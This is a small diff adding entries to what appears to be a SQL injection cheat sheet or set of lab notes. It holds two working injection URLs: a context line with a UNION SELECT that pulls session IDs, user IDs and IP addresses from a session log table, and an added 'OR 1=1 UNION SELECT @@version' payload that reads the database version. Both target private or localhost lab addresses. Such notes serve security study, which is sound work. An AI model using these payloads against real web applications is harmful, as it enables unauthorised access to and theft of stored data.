@@ -102,3 +102,6 @@ To Look at databases you don't have direct access 			           ######   POST ME
 
 		EXAMPLES
 			http://10.50.28.178/uniondemo.php?Selection=2 UNION SELECT session_id, user_id, remote_ip FROM session.session_log
+
+	How to get the SQL Version
+			http://127.0.0.1:1111/cases/productsCategory.php?category=1 OR 1=1 Union SELECT 1,2,@@version FROM information_schema.columns
